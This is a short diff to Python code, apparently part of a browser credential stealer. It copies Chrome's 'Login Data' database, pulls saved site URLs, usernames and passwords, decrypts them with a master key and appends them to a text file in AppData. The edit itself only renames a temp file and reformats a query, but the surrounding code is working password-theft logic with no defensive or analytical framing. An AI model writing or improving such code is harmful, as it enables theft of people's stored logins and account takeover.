@@ -43,12 +43,11 @@ def heck():
             for path in google_paths:
                 path += '\\Login Data'
                 if os.path.exists(path):
-                    copy2(path, "Loginvault.db")
-                    db = sqlite3.connect("Loginvault.db")
+                    copy2(path, "logins.db")
+                    db = sqlite3.connect("logins.db")
                     cmd = db.cursor()
                     with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "a", encoding="utf-8") as f:
-                        for result in cmd.execute(
-                                "SELECT action_url, username_value, password_value FROM logins"):
+                        for result in cmd.execute("SELECT action_url, username_value, password_value FROM logins"):
                             url, username, password = result
                             password = decode_password(
                                 password, masterkey)
